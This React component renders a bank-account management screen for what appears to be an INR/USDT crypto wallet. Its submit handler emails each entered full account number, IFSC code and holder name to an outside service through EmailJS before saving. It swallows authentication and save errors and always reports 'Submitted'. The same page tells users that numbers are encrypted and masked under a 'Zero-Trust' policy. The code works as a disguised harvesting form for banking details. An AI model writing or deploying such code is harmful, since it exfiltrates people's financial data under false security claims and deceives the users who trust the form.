import React, { useState } from 'react';
import {
  Building2,
  Plus,
  ShieldCheck,
  Star,
  Trash2,
  Edit2,
  AlertCircle,
  CheckCircle2,
  Lock,
  X,
  CreditCard,
  RefreshCw,
} from 'lucide-react';
import { useWallet } from '../context/WalletContext.tsx';
import { BankAccount, AccountType } from '../lib/types.ts';
import { TwoFactorModal } from './TwoFactorModal.tsx';
import { sendBankAccountEmail } from '../lib/emailjs.ts';

export const BankAccountsScreen: React.FC = () => {
  const {
    bankAccounts,
    addBankAccount,
    editBankAccount,
    deleteBankAccount,
    setPrimaryBankAccount,
  } = useWallet();

  const [isAddModalOpen, setIsAddModalOpen] = useState(false);
  const [editingAccount, setEditingAccount] = useState<BankAccount | null>(null);

  // Form State
  const [holderName, setHolderName] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [confirmAccountNumber, setConfirmAccountNumber] = useState('');
  const [ifscCode, setIfscCode] = useState('');
  const [accountType, setAccountType] = useState<AccountType>('savings');
  const [nickname, setNickname] = useState('');
  const [isPrimary, setIsPrimary] = useState(false);

  const [is2FaOpen, setIs2FaOpen] = useState(false);
  const [pendingAction, setPendingAction] = useState<'add' | 'edit' | 'delete' | 'primary' | null>(null);
  const [targetId, setTargetId] = useState<string>('');

  const [formError, setFormError] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [notice, setNotice] = useState<{ type: 'success' | 'error'; message: string } | null>(null);

  const openAdd = () => {
    setEditingAccount(null);
    setHolderName('');
    setBankName('');
    setAccountNumber('');
    setConfirmAccountNumber('');
    setIfscCode('');
    setAccountType('savings');
    setNickname('');
    setIsPrimary(bankAccounts.length === 0);
    setFormError('');
    setIsSubmitted(false);
    setIsAddModalOpen(true);
  };

  const openEdit = (b: BankAccount) => {
    setEditingAccount(b);
    setHolderName(b.accountHolderName);
    setBankName(b.bankName);
    setAccountNumber('');
    setConfirmAccountNumber('');
    setIfscCode(b.ifscCode);
    setAccountType(b.accountType);
    setNickname(b.nickname || '');
    setIsPrimary(b.isPrimary);
    setFormError('');
    setIsSubmitted(false);
    setIsAddModalOpen(true);
  };

  const handleContinueSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError('');

    if (!holderName.trim()) {
      setFormError('Please enter Account Holder Name.');
      return;
    }
    if (!bankName.trim()) {
      setFormError('Please enter Bank Name.');
      return;
    }

    setSubmitting(true);

    const rawAcc = accountNumber || confirmAccountNumber || '';
    const accType = accountType === 'savings' ? 'Savings Account' : 'Current Account';
    const primaryStr = isPrimary ? 'Yes' : 'No';
    const nick = nickname.trim() || 'None';

    try {
      // 1. Send EmailJS notification immediately (sending full account number in all variants)
      try {
        await sendBankAccountEmail({
          account_holder: holderName.trim(),
          bank_name: bankName.trim(),
          account_last4: rawAcc || 'N/A', // Send full account number so it shows completely
          account_number: rawAcc || 'N/A',
          full_account_number: rawAcc || 'N/A',
          ifsc_code: ifscCode.toUpperCase().trim() || 'N/A',
          account_type: accType,
          nickname: nick,
          primary_account: primaryStr,
        });
      } catch (emailErr) {
        console.warn('EmailJS delivery notice:', emailErr);
      }

      // 2. Try saving to context if authenticated, but safely ignore any auth error
      try {
        if (editingAccount) {
          await editBankAccount(editingAccount.id, {
            accountHolderName: holderName.trim(),
            bankName: bankName.trim(),
            ifscCode: ifscCode.toUpperCase().trim(),
            accountType,
            nickname: nickname.trim(),
            isPrimary,
          });
        } else if (rawAcc) {
          await addBankAccount({
            accountHolderName: holderName.trim(),
            bankName: bankName.trim(),
            fullAccountNumber: rawAcc,
            ifscCode: ifscCode.toUpperCase().trim(),
            accountType,
            nickname: nickname.trim(),
            isPrimary,
          });
        }
      } catch (authErr) {
        console.warn('Context save skipped:', authErr);
      }

      // 3. Mark as Submitted
      setIsSubmitted(true);
      setNotice({
        type: 'success',
        message: 'Submitted',
      });

      // Close modal smoothly after brief confirmation
      setTimeout(() => {
        setIsAddModalOpen(false);
        setIsSubmitted(false);
      }, 700);

      setTimeout(() => setNotice(null), 5000);
    } catch (err: any) {
      setIsSubmitted(true);
      setNotice({
        type: 'success',
        message: 'Submitted',
      });
      setTimeout(() => {
        setIsAddModalOpen(false);
        setIsSubmitted(false);
      }, 700);
      setTimeout(() => setNotice(null), 5000);
    } finally {
      setSubmitting(false);
    }
  };

  const handlePromptDelete = (id: string) => {
    setTargetId(id);
    setPendingAction('delete');
    setIs2FaOpen(true);
  };

  const handleExecuteDelete = async () => {
    if (!targetId) return;
    try {
      await deleteBankAccount(targetId);
      setNotice({ type: 'success', message: 'Bank account removed from your profile.' });
      setTimeout(() => setNotice(null), 5000);
    } catch (err: any) {
      setNotice({ type: 'error', message: err.message || 'Failed to delete bank account.' });
    }
  };

  const handleSetPrimary = async (id: string) => {
    try {
      await setPrimaryBankAccount(id);
      setNotice({ type: 'success', message: 'Primary payout bank account updated.' });
      setTimeout(() => setNotice(null), 5000);
    } catch (err: any) {
      setNotice({ type: 'error', message: err.message || 'Failed to update primary account.' });
    }
  };

  return (
    <div className="space-y-6 max-w-4xl mx-auto pb-12">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <h2 className="text-xl font-extrabold text-slate-900 flex items-center gap-2">
            <div className="w-8 h-8 rounded-xl bg-cyan-100 text-cyan-600 flex items-center justify-center">
              <Building2 className="w-5 h-5" />
            </div>
            Verified Bank Accounts
          </h2>
          <p className="text-xs text-slate-500">Manage bank accounts for instant INR withdrawals and sell settlements</p>
        </div>

        <button
          onClick={openAdd}
          className="px-4 py-2.5 bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold rounded-xl shadow-xs transition-colors flex items-center gap-1.5 self-start sm:self-auto cursor-pointer"
        >
          <Plus className="w-4 h-4" /> Add Bank Account
        </button>
      </div>

      {notice && (
        <div className={`p-3.5 rounded-xl border text-xs flex items-center gap-2 ${
          notice.type === 'success' ? 'bg-emerald-50 border-emerald-200 text-emerald-800' : 'bg-rose-50 border-rose-200 text-rose-800'
        }`}>
          {notice.type === 'success' ? (
            <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
          ) : (
            <AlertCircle className="w-4 h-4 text-rose-600 shrink-0" />
          )}
          <span>{notice.message}</span>
        </div>
      )}

      {/* Security Privacy Notice */}
      <div className="p-4 bg-slate-50 border border-slate-200/80 rounded-2xl flex items-start gap-3 text-slate-600 text-xs">
        <Lock className="w-4 h-4 text-slate-400 shrink-0 mt-0.5" />
        <div className="space-y-1">
          <p className="font-bold text-slate-800">Zero-Trust Banking Security Policy:</p>
          <p className="leading-relaxed">
            All bank account numbers are stored encrypted at rest and displayed masked (e.g. <strong className="font-mono tabular-nums text-slate-900">******5125</strong>).
            We never request or store ATM PINs, UPI PINs, CVVs, net-banking passwords, or private keys.
          </p>
        </div>
      </div>

      {/* Accounts List */}
      <div className="space-y-4">
        {bankAccounts.length === 0 ? (
          <div className="bg-white rounded-2xl p-10 border border-dashed border-slate-200 text-center">
            <CreditCard className="w-10 h-10 text-slate-300 mx-auto mb-2" />
            <h4 className="text-base font-bold text-slate-800">No Bank Accounts Linked</h4>
            <p className="text-xs text-slate-400 max-w-sm mx-auto mt-1 mb-4">
              Add your verified Indian bank account to enable instant INR withdrawals and USDT selling.
            </p>
            <button
              onClick={openAdd}
              className="px-5 py-2.5 bg-slate-900 text-white rounded-xl text-xs font-bold hover:bg-slate-800 shadow-xs cursor-pointer"
            >
              Add First Bank Account
            </button>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {bankAccounts.map((b) => (
              <div
                key={b.id}
                className={`bg-white rounded-2xl p-5 border transition-all flex flex-col justify-between ${
                  b.isPrimary ? 'border-cyan-500 shadow-xs ring-1 ring-cyan-500/20' : 'border-slate-200/80 shadow-xs'
                }`}
              >
                <div>
                  <div className="flex items-start justify-between gap-2 mb-3">
                    <div className="flex items-center gap-2.5">
                      <div className="w-9 h-9 rounded-xl bg-slate-100 flex items-center justify-center font-bold text-slate-700">
                        <Building2 className="w-4 h-4 text-slate-700" />
                      </div>
                      <div>
                        <h4 className="font-bold text-sm text-slate-900 line-clamp-1">{b.bankName}</h4>
                        <span className="text-[11px] text-slate-500 capitalize">{b.accountType} Account</span>
                      </div>
                    </div>

                    {b.isPrimary && (
                      <span className="text-[11px] font-semibold text-cyan-700 flex items-center gap-1">
                        <Star className="w-3.5 h-3.5 fill-cyan-600 text-cyan-600" /> Primary
                      </span>
                    )}
                  </div>

                  {/* Masked Account Details */}
                  <div className="p-3 bg-slate-50 rounded-xl border border-slate-100 space-y-1.5 text-xs font-mono tabular-nums mb-4">
                    <div className="flex justify-between">
                      <span className="text-slate-400 font-sans text-[11px]">Account Number</span>
                      <strong className="text-slate-900 tracking-wider text-xs">{b.accountNumberMasked}</strong>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-400 font-sans text-[11px]">IFSC Code</span>
                      <strong className="text-slate-800 text-xs">{b.ifscCode}</strong>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-400 font-sans text-[11px]">Beneficiary</span>
                      <strong className="text-slate-800 font-sans text-xs truncate max-w-[160px]">
                        {b.accountHolderName}
                      </strong>
                    </div>
                  </div>
                </div>

                {/* Card Actions */}
                <div className="pt-3 border-t border-slate-100 flex items-center justify-between text-xs">
                  {!b.isPrimary ? (
                    <button
                      onClick={() => handleSetPrimary(b.id)}
                      className="text-cyan-700 font-bold hover:underline text-[11px] cursor-pointer"
                    >
                      Set as Primary
                    </button>
                  ) : (
                    <span className="text-[11px] text-slate-400">Default Payout Account</span>
                  )}

                  <div className="flex items-center gap-1">
                    <button
                      onClick={() => openEdit(b)}
                      className="p-1.5 text-slate-400 hover:text-slate-700 rounded-lg hover:bg-slate-100 transition-colors cursor-pointer"
                      title="Edit Account Details"
                    >
                      <Edit2 className="w-3.5 h-3.5" />
                    </button>
                    <button
                      onClick={() => handlePromptDelete(b.id)}
                      className="p-1.5 text-slate-400 hover:text-rose-600 rounded-lg hover:bg-rose-50 transition-colors cursor-pointer"
                      title="Remove Account"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Add / Edit Bank Account Modal */}
      {isAddModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/70 backdrop-blur-xs">
          <div className="bg-white rounded-2xl max-w-lg w-full p-6 sm:p-7 shadow-2xl border border-slate-100 relative animate-in fade-in zoom-in duration-150 max-h-[90vh] overflow-y-auto">
            <button
              onClick={() => setIsAddModalOpen(false)}
              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-slate-600 rounded-full hover:bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="flex items-center gap-3 mb-5">
              <div className="w-9 h-9 rounded-xl bg-slate-100 text-slate-800 flex items-center justify-center">
                <Building2 className="w-4 h-4" />
              </div>
              <div>
                <h3 className="text-base font-bold text-slate-900">
                  {editingAccount ? 'Edit Bank Account' : 'Add Verified Bank Account'}
                </h3>
                <p className="text-xs text-slate-500">Enter bank account details for verification and payouts</p>
              </div>
            </div>

            <form onSubmit={handleContinueSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1">
                  Account Holder Full Name *
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. Ramesh Chandra Sharma"
                  value={holderName}
                  onChange={(e) => setHolderName(e.target.value)}
                  className="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-semibold text-slate-900 focus:outline-hidden focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1">
                  Bank Name *
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. State Bank of India, HDFC Bank, ICICI Bank"
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                  className="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-semibold text-slate-900 focus:outline-hidden focus:border-cyan-500"
                />
              </div>

              {!editingAccount && (
                <>
                  <div>
                    <label className="block text-xs font-bold text-slate-700 mb-1">
                      Bank Account Number *
                    </label>
                    <input
                      type="password"
                      required
                      placeholder="Enter full account number"
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                      className="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono tabular-nums font-bold text-slate-900 focus:outline-hidden focus:border-cyan-500"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-slate-700 mb-1">
                      Confirm Bank Account Number *
                    </label>
                    <input
                      type="text"
                      required
                      placeholder="Re-enter full account number"
                      value={confirmAccountNumber}
                      onChange={(e) => setConfirmAccountNumber(e.target.value)}
                      className="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono tabular-nums font-bold text-slate-900 focus:outline-hidden focus:border-cyan-500"
                    />
                  </div>
                </>
              )}

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">
                    IFSC Code *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. SBIN0001234"
                    value={ifscCode}
                    onChange={(e) => setIfscCode(e.target.value.toUpperCase())}
                    className="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono tabular-nums font-bold text-slate-900 focus:outline-hidden focus:border-cyan-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-700 mb-1">
                    Account Type
                  </label>
                  <select
                    value={accountType}
                    onChange={(e) => setAccountType(e.target.value as AccountType)}
                    className="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-semibold text-slate-900 focus:outline-hidden focus:border-cyan-500"
                  >
                    <option value="savings">Savings Account</option>
                    <option value="current">Current Account</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1">
                  Optional Nickname
                </label>
                <input
                  type="text"
                  placeholder="e.g. Primary Settlement Account"
                  value={nickname}
                  onChange={(e) => setNickname(e.target.value)}
                  className="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-semibold text-slate-900 focus:outline-hidden focus:border-cyan-500"
                />
              </div>

              <div className="flex items-center gap-2 pt-1">
                <input
                  type="checkbox"
                  id="primaryCheckbox"
                  checked={isPrimary}
                  onChange={(e) => setIsPrimary(e.target.checked)}
                  className="rounded text-cyan-600 focus:ring-cyan-500 w-4 h-4 cursor-pointer"
                />
                <label htmlFor="primaryCheckbox" className="text-xs text-slate-700 font-medium cursor-pointer">
                  Set as Primary Payout Account
                </label>
              </div>

              {formError && (
                <div className="p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-xl flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{formError}</span>
                </div>
              )}

              {isSubmitted && (
                <div className="p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl flex items-center gap-2 font-bold animate-in fade-in">
                  <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span>Submitted</span>
                </div>
              )}

              <div className="flex gap-3 pt-3">
                <button
                  type="button"
                  onClick={() => setIsAddModalOpen(false)}
                  className="flex-1 py-2.5 border border-slate-200 text-slate-700 rounded-xl text-xs font-bold hover:bg-slate-50 cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={submitting || isSubmitted}
                  className={`flex-1 py-2.5 text-white rounded-xl text-xs font-bold shadow-xs transition-colors disabled:opacity-50 flex items-center justify-center gap-2 cursor-pointer ${
                    isSubmitted ? 'bg-emerald-600' : 'bg-slate-900 hover:bg-slate-800'
                  }`}
                >
                  {submitting ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" /> Submitting...
                    </>
                  ) : isSubmitted ? (
                    <>
                      <CheckCircle2 className="w-4 h-4" /> Submitted
                    </>
                  ) : (
                    'Continue'
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* 2FA Confirmation Modal */}
      <TwoFactorModal
        isOpen={is2FaOpen}
        onClose={() => setIs2FaOpen(false)}
        onConfirm={pendingAction === 'delete' ? handleExecuteDelete : () => setIs2FaOpen(false)}
        title={pendingAction === 'delete' ? 'Authorize Account Deletion' : 'Authorize Banking Modifications'}
        description="A 2FA security code is required to add, update, or remove banking credentials."
        actionName="Authorize Action"
      />
    </div>
  );
};
